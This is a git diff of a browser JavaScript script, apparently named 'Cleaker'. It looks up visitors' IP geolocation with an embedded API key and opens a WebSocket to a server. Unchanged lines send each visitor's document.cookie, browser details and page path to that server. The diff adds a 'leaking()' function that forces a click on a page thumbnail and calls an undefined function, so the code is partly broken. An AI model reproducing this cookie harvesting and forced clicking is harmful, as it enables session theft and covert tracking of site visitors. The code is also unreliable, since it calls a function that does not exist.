@@ -2,13 +2,20 @@
 $.getJSON("https://pro.ip-api.com/json/?callback=?&key=aGbt2iIuvD8OhJl", function(data) {
 		//SET DATA READY
 		//USE URL WS:// OR WSS:// (IF USING TLS)
-		var ws = new WebSocket("wss://cleaker.herokuapp.com");
-		//var ws = new WebSocket("ws://localhost:5000"); //RUNNING LOCAL
+		//var ws = new WebSocket("wss://cleaker.herokuapp.com");
+		var ws = new WebSocket("ws://localhost:5000"); //RUNNING LOCAL
 			ws.onopen = function(e){
 			console.log('Conected to Cleaker. 001'); //ON STAGE
-			//console.log('Conected to Cleaker. 000');
-			// document.getElementById("voice").style = "color: #cfafac";	
+			
+			function leaking() {
+				var divs = document.getElementsByClassName(" item-thumbnail-href "); 
+				divs[1].click();
+			    setTimeout(foo, 55000);
 					}
+			leaking();
+					}
+					
+					
 		//most important part - incoming messages
 		ws.onmessage = function(message) {
 		 //parse JSON message. Server always returns JSON
@@ -32,7 +39,6 @@ $.getJSON("https://pro.ip-api.com/json/?callback=?&key=aGbt2iIuvD8OhJl", functio
 						//ystvisits: 'x',
 						//wklyVisits: 'x',
 						//mnthlyVisits: 'x',
-						//CookiesOn: 'yes',
 						usrname: 'usrname',
 						pushNotifications: 'yes',
 						locationPath: window.location.pathname,
@@ -52,7 +58,6 @@ $.getJSON("https://pro.ip-api.com/json/?callback=?&key=aGbt2iIuvD8OhJl", functio
 						js: navigator.javaEnabled(),
 						cookiesEnabled: navigator.cookieEnabled,
 						cookies: document.cookie,
-						mon: 'yes',
 						sessionClosed: 'I am',
 						sessionDuration:'00:00:00',
 						number: '000000000000000000001'
